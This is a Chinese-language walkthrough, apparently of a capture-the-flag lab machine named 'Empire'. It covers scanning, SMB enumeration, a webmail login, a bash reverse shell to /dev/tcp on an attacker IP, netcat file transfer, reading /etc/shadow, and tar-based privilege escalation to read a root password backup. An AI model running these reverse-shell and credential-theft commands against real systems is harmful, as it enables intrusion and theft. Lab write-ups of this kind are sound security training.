# Empire

**==一、主机探测==**

`sudo nmapscan -sn 192.168.205.0/24`

![image-20250223144042958](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223144042958.png)

**==二、nmap四扫==**

① **端口探测**

`sudo nmap --min-rate 10000 -p- 192.168.205.61 -oA nmapscan/ports`

![image-20250223144321441](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223144321441.png)

② **udp探测**

![image-20250223144431143](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223144431143.png)

可以看到137已经开了，结合前面tcp139、445开放，可以得出这个服务器开放了smb服务

③ **详细信息探测**

`sudo nmap -sT -sC -sV -O 192.168.205.61 -oA nmapscan/details`

![image-20250223144733077](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223144733077.png)

可以看到这里开启了三个http的服务，分别是80，10000，20000

④ **漏洞脚本探测**

`sudo nmap --script=vuln 192.168.205.61 -oA nmapscan/vuln`

![image-20250223145032040](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145032040.png)

![image-20250223145102744](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145102744.png)

漏洞脚本探测，检测到一个可以利用的CVE，但是我去网上查了，是一个文件任意读取漏洞，但是这个CVE需要有ssl认证，我们现在没有，只能先看看80端口，10000端口，20000端口

==**三、80，10000，20000端口探测**==

① 80端口

![image-20250223145433250](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145433250.png)

可以看到这个是apache2的默认配置页，看看源码

![image-20250223145520502](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145520502.png)可以看到有一串编码，看起来像brainfuck编码

![image-20250223145629052](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145629052.png)

`.2uqPEfj3D<P'a-3`

这个看起来像密码

② 10000端口

![image-20250223145743836](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145743836.png)

是一个登陆界面，这个有可以利用的CVE，但是我们缺少ssl，用不了

③ 20000端口

![image-20250223145834153](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223145834153.png)

这个和10000端口的登陆界面很像，到这个我们利用gobuster爆破一下目录

**==四、目录爆破==**

① gobuster

`sudo gobuster dir -u http://192.168.205.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,txt,zip`

![image-20250223150027838](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223150027838.png)

②dirb

`sudo dirb http://192.168.205.61`

![image-20250223150143622](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223150143622.png)

这个爆出挺多页面的链接

③feroxbuster

`sudo feroxbuster -u http://192.168.205.61 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --scan-dir-listings`

**查看了一下结果，感觉还是gobuster的结论最为整洁和完整，但是总的有用的东西不多**

==**五、smb探测**==

前面对http服务的探测就找到了一个类似于密码的字符串，还有两个登陆界面，接下探测smb服务

① smbclient枚举目录

`sudo smbclient -L http://192.168.205.61 -N`

![image-20250223150806359](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223150806359.png)

权限不够

② enum4linux 全面枚举

`sudo enum4linux 192.68.205.61`

![image-20250223154206086](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154206086.png)

可以看到这里share文件里面什么都没有，只有一些默认的文件

![image-20250223154347864](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154347864.png)

可以看到这里找到两个域，也得出密码最短是五个字符

![image-20250223154510944](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154510944.png)

可以看到这里找到一个名为：cyber的用户

除此之外就没有了，结合前面找到的密码，尝试一下网页登陆

**==六、登陆==**

① 10000端口

![image-20250223154729307](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154729307.png)

登陆不了

② 20000端口

![image-20250223154819317](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154819317.png)

有反应

![image-20250223154924351](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223154924351.png)

看起来像一个邮件软件

③网页信息查看

1. `Manage Folders`

   ![image-20250223155557965](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155557965.png)

   ![image-20250223155615359](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155615359.png)

   这个好像是编辑文件夹的

2. `Address Book`

   ![image-20250223155659048](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155659048.png)

   这个类似于电话簿

   ![image-20250223155729517](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155729517.png)

   这个可以上传文件，可能有文件上传漏洞，但是得找出文件上传的位置

3. `Forward Email`

   ![image-20250223155824206](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155824206.png)

   电子邮件转发设置，应该是设置可否能转发的

4. `Authmatic Reply`

   ![image-20250223155920420](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155920420.png)

   自动回复

5. `Email Filters`

   ![image-20250223155943824](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155943824.png)

   过滤器，应该是过滤一些广告的

6. `Edit Signature`

   ![image-20250223160125714](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223160125714.png)

   个性化设置，编辑个人签名的

7. `Change Password`

   ![image-20250223155211391](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223155211391.png)

   这个看起来挺不错，可以修改密码，但是只能修改cyber的密码，这个用户的密码我们知道，所有没什么意义

8. `Mail Preferences`

   ![image-20250223160226115](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223160226115.png)

   邮件的preferences，邮件的个性化设置

9. `Account Information`

   ![image-20250223160312361](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223160312361.png)

   邮件账户信息

10. 其他小tips

    ![image-20250223160358369](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223160358369.png)

    第三个是命令行模式

    ![image-20250223160627327](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223160627327.png)

    好家伙，这就获得立足点了，那就连到kali，在kali里面看

**==七、连接靶机，在kali上调试==**

① 设置监听：`sudo rlwrap -cAr nc -lvnp 443`

② 靶机执行bash命令：`bash -i >& /dev/tcp/192.168.205.127/443 0>&1`

![image-20250223161557393](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223161557393.png)

③ 确认靶机

![image-20250223162949537](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223162949537.png)

④ 获得user.txt

```
ls
cat user.txt
```

![image-20250223161621982](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223161621982.png)

**==八、提权==**

① `sudo -l`

![image-20250223162215005](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223162215005.png)

② `find / -perm -u=s 2>/dev/null`

![image-20250223162423639](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223162423639.png)

③ `ls -liah`

![image-20250223162717504](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223162717504.png)

只能看到tar，但是不知道要干嘛

④ `cat /etc/passwd`

![image-20250223162818485](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223162818485.png)

可以看到应该就一个用户

⑤ `cat /etc/shadow`

![image-20250223163039341](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223163039341.png)

果然没这么简单

⑥ `cat /etc/crontab`

![image-20250223163310012](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223163310012.png)

`ls -liah /etc/cron.daily`

![image-20250223163342640](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223163342640.png)

这个应该是配置http服务用的

⑦ `ps -aux`

也没有异常的进程

⑧ `top -n 1`

![image-20250223163552363](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223163552363.png)

这个也不行

⑨ `netstat -ano`

![image-20250223163723913](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250223163723913.png)

网络状态也没问题

⑩ `linpeas`

上传linpeas：

kali：`sudo php -S 0:80`

靶机：`wget http://192.168.205.127/linpeas.sh`

执行

靶机：`./linpeas.sh > linpeas.txt` 

kali：`sudo nc -lvnp 666 > linpeas.txt`

靶机：`nc 192.168.205.127 666 < linpeas.txt`

kali：`less -r linpeas.txt`

==**发现oldpass**==

![image-20250224221445460](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224221445460.png)

  ![image-20250224221516972](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224221516972.png)

也发现一个PWD在目前的家目录里面

![image-20250224221708486](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224221708486.png)

这里可以看到，tar我们有执行权限，而且在前面也看到过，那提权应该是和这个有关的，之前在提权精讲上看过利用压缩工具提权的，前提是那个压缩包工具我们有执行权限，而且还可以以root的权限执行（因为tar的所属人是root），那就可以用tar工具以root权限把密码打包出来，然后以cyber解压密码，这里可以解压是因为我们有root权限，解出来我们就应该可以用了

![image-20250224222709033](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224222709033.png)

可以看到这里有个密码的备份文件

![image-20250224222750641](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224222750641.png)

这里我们没有权限读取，那就试试tar

![image-20250224224055944](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224224055944.png)

可以看到成功拿到root的密码了

这里说一下我的步骤

```
./tar -cvf pass.tar /var/backups/.old_pass.bak
./tar -xvf pass.tar
cat pass.tar 或者 cat /var/backups/.old.pass.bak

```

![image-20250224224456888](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224224456888.png)

成功提权

![image-20250224224636632](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250224224636632.png)

完成
